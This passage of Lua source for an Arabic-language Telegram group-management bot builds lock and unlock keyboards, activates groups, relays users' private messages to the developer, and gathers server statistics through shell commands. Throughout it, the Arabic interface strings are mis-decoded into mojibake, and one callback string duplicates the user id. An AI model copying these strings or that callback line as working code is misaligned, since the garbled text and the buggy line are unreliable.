{text = 'ΩΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ±', callback_data=msg.sender_user_id_.."/lockflood"},{text = 'ΩΨͺΨ­ Ψ§ΩΨͺΩΨ±Ψ§Ψ±', callback_data=msg.sender_user_id_.."/unlockflood"},
},
{
{text = 'ΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ', callback_data=msg.sender_user_id_.."/lockfarse"},{text = 'ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ', callback_data=msg.sender_user_id_.."/unlockfarse"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ³Ψ¨', callback_data=msg.sender_user_id_.."/lockfshar"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ³Ψ¨', callback_data=msg.sender_user_id_.."/unlockfshar"},
},
{
{text = 'ΩΩΩ Ψ§ΩΨ§ΩΩΨ§ΩΩ', callback_data=msg.sender_user_id_.."/lockinlene"},{text = 'ΩΨͺΨ­ Ψ§ΩΨ§ΩΩΨ§ΩΩ', callback_data=msg.sender_user_id_.."/unlockinlene"},
},

}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨΉΨ·ΩΩ' and Addictive(msg) then
local Texti = 'ΨͺΨ³ΨͺΨ·ΩΨΉ ΨͺΨΉΨ·ΩΩ ΩΨͺΩΨΉΩΩ ΨΉΨ¨Ψ± Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ±'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ²ΩΩ', callback_data=msg.sender_user_id_.."/lockdul"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ²ΩΩ', callback_data=msg.sender_user_id_.."/unlockdul"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·', callback_data=msg.sender_user_id_.."/lock_links"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·', callback_data=msg.sender_user_id_.."/unlock_links"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨', callback_data=msg.sender_user_id_.."/lockwelcome"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨', callback_data=msg.sender_user_id_.."/unlockwelcome"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ', callback_data=msg.sender_user_id_.."/lockrepall"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΨΉΨ§ΩΩ', callback_data=msg.sender_user_id_.."/unlockrepall"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω', callback_data=msg.sender_user_id_.."/lockide"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω', callback_data=msg.sender_user_id_.."/unlockide"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω', callback_data=msg.sender_user_id_.."/lockidephoto"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω', callback_data=msg.sender_user_id_.."/unlockidephoto"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ±', callback_data=msg.sender_user_id_.."/lockkiked"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΨΈΨ±', callback_data=msg.sender_user_id_.."/unlockkiked"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ', callback_data=msg.sender_user_id_.."/locksetm"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±ΩΨΉ', callback_data=msg.sender_user_id_.."/unlocksetm"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ', callback_data=msg.sender_user_id_.."/lockkikedme"},{text = 'ΨͺΩΨΉΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ', callback_data=msg.sender_user_id_.."/unlockkikedme"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨', callback_data=msg.sender_user_id_.."/lockgames"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨', callback_data=msg.sender_user_id_.."/unlockgames"},
},
{
{text = 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ―ΩΨ―', callback_data=msg.sender_user_id_..msg.sender_user_id_.."/lockrepgr"},{text = 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ―ΩΨ―', callback_data=msg.sender_user_id_.."/unlockrepgr"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Texti).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end


end ---- Chat_Type = 'GroupBot' 
end ---- Chat_Type = 'GroupBot' 
if text == 'ΨͺΩΨΉΩΩ' and DevBot(msg) then 
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'πΈβΏΨ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Tshake:Num:Add:Bot') or 0) and not DevTshake(msg) then
send(msg.chat_id_, msg.id_,'π₯βΏΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΨ¬ΩΩΨΉΩ Ψ§ΩΩ ΩΩ *~ {'..(database:get(bot_id..'Tshake:Num:Add:Bot') or 0)..'* ΨΉΨΆΩ')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if database:sismember(bot_id..'Tshake:Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'ββΏΨ§ΩΩΨ¬ΩΩΨΉΩ ΩΩΨΉΩΩ Ψ³Ψ§Ψ¨ΩΨ§ ')
else
Reply_Status(msg,result.id_,'reply_Add','ββΏΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ '..chat.title_..'')
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
database:sadd(bot_id..'Tshake:Basic:Constructor23'..msg.chat_id_, owner_id)
end
end
end,nil)
database:sadd(bot_id..'Tshake:Chek:Groups',msg.chat_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
database:set(bot_id.."Tshake:Private:Group:Link"..msg.chat_id_,LinkGp)
Text = 'π¨βΏΨͺΩ ΨͺΩΨΉΩΩ ΩΨ¬ΩΩΨΉΩ Ψ¬Ψ―ΩΨ―Ω\n'..
'\nπ€βΏΨ¨ΩΨ§Ψ³Ψ·Ψ© ~ '..Name..''..
'\nπ?βΏΨ§ΩΨ―Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ `'..IdChat..'`'..
'\nπ₯βΏΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΨ¬ΩΩΨΉΩ *~ '..NumMember..'*'..
'\nπβΏΨ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ ['..NameChat..']'..
'\nπ βΏΨ§ΩΨ±Ψ§Ψ¨Ψ· ~ ['..LinkGp..']'
if not DevTshake(msg) then
sendText(Id_Sudo,Text,0,'md')
end
end
end,nil) 
end,nil) 
end,nil)
end
if text == 'ΨͺΨΉΨ·ΩΩ' and DevBot(msg) then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if not database:sismember(bot_id..'Tshake:Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'π βΏΨ§ΩΩΨ¬ΩΩΨΉΩ ΩΨΉΨ·ΩΩ Ψ³Ψ§Ψ¨ΩΨ§ ')
else
Reply_Status(msg,result.id_,'reply_Add','ββΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ '..chat.title_..'')
database:srem(bot_id..'Tshake:Chek:Groups',msg.chat_id_)  
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
database:set(bot_id.."Tshake:Private:Group:Link"..msg.chat_id_,LinkGp) 

Text = 'π¨βΏΨͺΩ ΨͺΨΉΨ·ΩΩ ΩΨ¬ΩΩΨΉΩ Ψ¬Ψ―ΩΨ―Ω\n'..
'\nπβΏΨ¨ΩΨ§Ψ³Ψ·Ψ© ~ '..Name..''..
'\nπ§βΏΨ§ΩΨ―Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ `'..IdChat..'`'..
'\nπ βΏΨ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ ['..NameChat..']'..
'\nπ βΏΨ§ΩΨ±Ψ§Ψ¨Ψ· ~ ['..LinkGp..']'
if not DevTshake(msg) then
sendText(Id_Sudo,Text,0,'md')
end
end
end,nil) 
end,nil) 
end
if text == 'ΨͺΩΨΉΩΩ' and not DevBot(msg) and not database:get(bot_id..'Tshake:Free:Add:Bots') then 
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'πΈβΏΨ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusEditor" or da and da.status_.ID == "ChatMemberStatusCreator" then
if da and da.user_id_ == msg.sender_user_id_ then
if da.status_.ID == "ChatMemberStatusCreator" then
var = 'Ψ§ΩΩΩΨ΄Ψ¦'
elseif da.status_.ID == "ChatMemberStatusEditor" then
var = 'Ψ§ΩΨ§Ψ―ΩΩ'
else 
var= 'ΨΉΨΆΩ'
end
if database:sismember(bot_id..'Tshake:Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'π βΏΨ§ΩΩΨ¬ΩΩΨΉΩ ΩΩΨΉΩΩ Ψ³Ψ§Ψ¨ΩΨ§ ')
else
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Tshake:Num:Add:Bot') or 0) and not DevTshake(msg) then
send(msg.chat_id_, msg.id_,'π₯βΏΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΨ¬ΩΩΨΉΩ Ψ§ΩΩ ΩΩ *~ {'..(database:get(bot_id..'Tshake:Num:Add:Bot') or 0)..'* ΨΉΨΆΩ')
return false
end
Reply_Status(msg,result.id_,'reply_Add','ββΏΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ '..chat.title_..'')
database:sadd(bot_id..'Tshake:Chek:Groups',msg.chat_id_)  
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
database:sadd(bot_id..'Tshake:Basic:Constructor23'..msg.chat_id_, owner_id)
end
end
end,nil)
database:sadd(bot_id..'Tshake:Basic:Constructor'..msg.chat_id_, msg.sender_user_id_)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local AddPy = var
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
Text = 'π¨βΏΨͺΩ ΨͺΩΨΉΩΩ ΩΨ¬ΩΩΨΉΩ Ψ¬Ψ―ΩΨ―Ω\n'..
'\nπ½βΏΨ¨ΩΨ§Ψ³Ψ·Ψ© ~ '..Name..''..
'\nπβΏΩΩΩΨΉΩ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ '..AddPy..'' ..
'\nπ?βΏΨ§ΩΨ―Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ `'..IdChat..'`'..
'\nπ₯βΏΨΉΨ―Ψ― Ψ§ΨΉΨΆΨ§Ψ‘ Ψ§ΩΩΨ¬ΩΩΨΉΩ *~ '..NumMember..'*'..
'\nπβΏΨ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ ['..NameChat..']'..
'\nπ βΏΨ§ΩΨ±Ψ§Ψ¨Ψ· ~ ['..LinkGp..']'
if not DevTshake(msg) then
sendText(Id_Sudo,Text,0,'md')
end
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil)
end

if Chat_Type == 'UserBot' then
if text == '/start' then  
if DevTshake(msg) then
local Text = 'βοΈΨ΄ΩΨ±Ψ§ ΩΨ§Ψ³ΨͺΨ?Ψ―Ψ§ΩΩ Ψ³ΩΨ±Ψ³ Ψ§ΩΩΨ§ Ψ§ΩΨͺ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω ΩΩΩΨ§ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨ¬ΩΨ²Ω ΩΩπ».'
local keyboard = {
{'Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ π'},
{'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω β‘','ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω π‘'},
{'ΨͺΩΨΈΩΩ ΩΨ§ΩΨ¬Ψ±ΩΨ¨Ψ§Ψͺ βΉ','ΨͺΩΨΈΩΩ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ β '},
{'ΨͺΩΨΉΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ π ','ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ π?'},
{'Ψ§Ψ°Ψ§ΨΉΩ Ψ?Ψ§Ψ΅ π‘','Ψ§ΩΩΨ·ΩΨ±ΩΩ π±','Ψ§Ψ°Ψ§ΨΉΩ π‘'},
{'Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ π₯','Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ Ψ?Ψ§Ψ΅ π€'},
{'ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ π','ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ π'},
{'ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω π ','ΩΨ³Ψ­ Ψ§ΩΩΨ·ΩΨ±ΩΩ πΈ'},
{'Ψ­Ψ°Ω ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ π','ΨΆΨΉ ΩΩΩΨ΄Ω Ψ³ΨͺΨ§Ψ±Ψͺ π§'},
{"ΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ π"},
{'ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³ π ','ΨͺΨ­Ψ―ΩΨ« β»'},
{'ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨ³ΩΨ±ΩΨ± π‘'},
{'ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω π·'},
{'Ψ¬ΩΨ¨ ΩΨ³Ψ?Ω Ψ§Ψ­ΨͺΩΨ§Ψ·ΩΩ π'},
{'Ψ§ΩΨΊΨ§Ψ‘ β'}
}
send_inline_key(msg.chat_id_,Text,keyboard)
else
if not database:get(bot_id..'Tshake:Start:Time'..msg.sender_user_id_) then
local start = database:get(bot_id.."Start:Bot")  
if start then 
Test = start
else
Test = 'β’ ΩΨ±Ψ­Ψ¨Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΨ§ Ψ¨ΩΨͺ Ψ­ΩΨ§ΩΩ\nβ’ Ψ§Ψ?ΨͺΨ΅Ψ§Ψ΅Ω Ψ­ΩΨ§ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ ΩΩ Ψ§ΩΨ§Ψ΄ΩΨ§Ψ‘ Ψ§ΩΨͺΩ ΨͺΨΆΨ±ΩΨ§\nβ’ ΩΩ ΩΨ§ ΨΉΩΩΩ ΩΨΉΩΩ Ψ±ΩΨΉΩ ΩΨ΄Ψ±Ω Ψ¨ΩΨ¬ΩΩΨΉΨͺΩ ΩΨ§ΩΨͺΨ¨ ΩΩΩΩ " ΨͺΩΨΉΩΩ" \nβ’ ΩΨ·ΩΨ± Ψ§ΩΨ¨ΩΨͺ ['..UserName..']'
end 
send(msg.chat_id_, msg.id_, Test) 
end
end
database:setex(bot_id..'Tshake:Start:Time'..msg.sender_user_id_,60,true)
return false
end
if not DevTshake(msg) and not database:sismember(bot_id..'BaN:In:User',msg.sender_user_id_) and not database:get(bot_id..'Texting:In:Bv') then
send(msg.sender_user_id_,msg.id_,'πΉβΏΨͺΩΨͺ Ψ§Ψ±Ψ³Ψ§Ω Ψ±Ψ³Ψ§ΩΨͺΩ Ψ§ΩΩ β© ['..UserName..']')    
tdcli_function({ID ="GetChat",chat_id_=Id_Sudo},function(arg,chat)  
tdcli_function({ID ="GetChat",chat_id_=msg.sender_user_id_},function(arg,chat)  
tdcli_function({ID="ForwardMessages",chat_id_=Id_Sudo,from_chat_id_= msg.sender_user_id_,message_ids_={[0]=msg.id_},disable_notification_=1,from_background_=1},function(arg,data) 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,ta) 
if data and data.messages_ and data.messages_[0] ~= false and data.ID ~= "Error" then
if data and data.messages_ and data.messages_[0].content_.sticker_ then
sendText(Id_Sudo,'??βΏΨͺΩ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΩΩΨ΅Ω ΩΩ ~ ['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')',0,'md') 
return false
end;end;end,nil);end,nil);end,nil);end,nil);end
if DevTshake(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'Ψ­ΨΈΨ±' then
sendText(Id_Sudo,'π€βΏ ΩΨ΄Ψ?Ψ΅ Β» ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\nπβΏ ΨͺΩ Ψ­ΨΈΨ±Ω ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω ',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'BaN:In:User',data.id_)  
return false  
end 
if text =='Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ­ΨΈΨ±' then
sendText(Id_Sudo,'π€βΏΨ§ΩΨ΄Ψ?Ψ΅ Β» ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\nπβΏ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±Ω ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω ',msg.id_/2097152/0.5,'md')
database:srem(bot_id..'BaN:In:User',data.id_)  
return false  
end 
tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
send(msg.chat_id_, msg.id_,'\nπβΏ ΩΨ΄Ω Ψ§Ψ±Ψ³Ψ§Ω Ψ±Ψ³Ψ§ΩΨͺΩ ΩΨ§Ω Ψ§ΩΨΉΨΆΩ ΩΨ§Ω Ψ¨Ψ­ΨΈΨ± Ψ§ΩΨ¨ΩΨͺ') 
return false  
end 
if text then    
send(id_user,msg.id_,text)    
Text = 'π¨βΏΨͺΩΨͺ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ±Ψ³Ψ§ΩΩ Ψ§ΩΩΩ .. '
elseif msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, msg.content_.sticker_.sticker_.persistent_id_)   
Text = 'π¨βΏΨͺΩΨͺ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΩΩΨ΅Ω Ψ§ΩΩΩ .. '
elseif msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
Text = 'π¨βΏΨͺΩΨͺ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ΅ΩΨ±Ω Ψ§ΩΩΩ .. '
elseif msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, msg.content_.animation_.animation_.persistent_id_)    
Text = 'π¨βΏΨͺΩΨͺ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ§ΩΩΩ .. '
elseif msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, msg.content_.voice_.voice_.persistent_id_)    
Text = 'π¨βΏΨͺΩΨͺ Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ¨Ψ΅ΩΩ Ψ§ΩΩΩ .. '
end     
sendText(Id_Sudo,Text..'\n'..'π€βΏ ~ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')',0,'md') 
end,nil);end,nil);end,nil);end,nil);end 
if DevTshake(msg) then
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω β‘' then  
database:del(bot_id..'Texting:In:Bv') 
send(msg.chat_id_, msg.id_,'πβΏ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω ') 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω π‘' then  
database:set(bot_id..'Texting:In:Bv',true) 
send(msg.chat_id_, msg.id_,'πβΏ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ§Ψ΅Ω ') 
end
if text == 'ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨ³ΩΨ±ΩΨ± π‘' then
   ioserver =  io.popen([[
         linux_version=`lsb_release -ds`
         memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
         HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
         CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
         uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
         echo 'πl β’β± { ΩΨΈΨ§Ω Ψ§ΩΨͺΨ΄ΨΊΩΩ } β°β’\n*Β»Β» '"$linux_version"'*' 
         echo '*------------------------------\n*π¨l β’β± { Ψ§ΩΨ°Ψ§ΩΨ±Ω Ψ§ΩΨΉΨ΄ΩΨ§Ψ¦ΩΩ } β°β’\n*Β»Β» '"$memUsedPrc"'*'
         echo '*------------------------------\n*πΎl β’β± { ΩΨ­ΩΨ―Ω Ψ§ΩΩΨͺΩΨ?ΩΨ²ΩΩΩ } β°β’\n*Β»Β» '"$HardDisk"'*'
         echo '*------------------------------\n*βοΈl β’β± { Ψ§ΩΩΩΩΩΨΉΩΩΨ§ΩΩΩΨ¬ } β°β’\n*Β»Β» '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
         echo '*------------------------------\n*π‘l β’β± { ΩΩΩΩΨΉ Ψ§ΩΩΨ³ΩΩΩΨ±ΩΩΨ± } β°β’\n*Β»Β» '`curl http://th3boss.com/ip/location`'*'
         echo '*------------------------------\n*π¨πΎβπ§l β’β± { Ψ§ΩΩΩΨ―Ψ?ΩΩΩΩ } β°β’\n*Β»Β» '`whoami`'*'
         echo '*------------------------------\n*πl β’β± { ΩΩΨ―Ω ΨͺΩΨ΄ΨΊΩΩΩ Ψ§ΩΩΨ³ΩΩΩΨ±ΩΩΨ± } β°β’  \n*Β»Β» '"$uptime"'*'
         ]]):read('*all')
         send(msg.chat_id_, msg.id_,ioserver)
   return false
   end
if text =='Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ π' then
local Groups = database:scard(bot_id..'Tshake:Chek:Groups')  
local Users = database:scard(bot_id..'Tshake:UsersBot')  
send(msg.chat_id_, msg.id_,'πβΏΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ Ψ§ΩΨ¨ΩΨͺ \n\nπ₯βΏΨΉΨ―Ψ― Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ *~ '..Groups..'\nπ€βΏΨΉΨ―Ψ― Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ ~ '..Users..'*')
end
if text == "ΨͺΩΨΈΩΩ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ β " then
local pv = database:smembers(bot_id..'Tshake:UsersBot')  
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,data) 
if data.ID and data.ID == "Ok"  then
print('\27[30;33mΒ»Β» THE USER IS SAVE ME β\nΒ»Β» '..pv[i]..'\n\27[1;37m')
else
print('\27[30;31mΒ»Β» THE USER IS BLOCK ME β\nΒ»Β» '..pv[i]..'\n\27[1;37m')
database:srem(bot_id..'Tshake:UsersBot',pv[i])  
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'π€βΏΩΨ§ ΩΩΨ¬Ψ― ΩΨ΄ΨͺΨ±ΩΩΩ ΩΩΩΩΩΩ')   
else
local ok = #pv - sendok
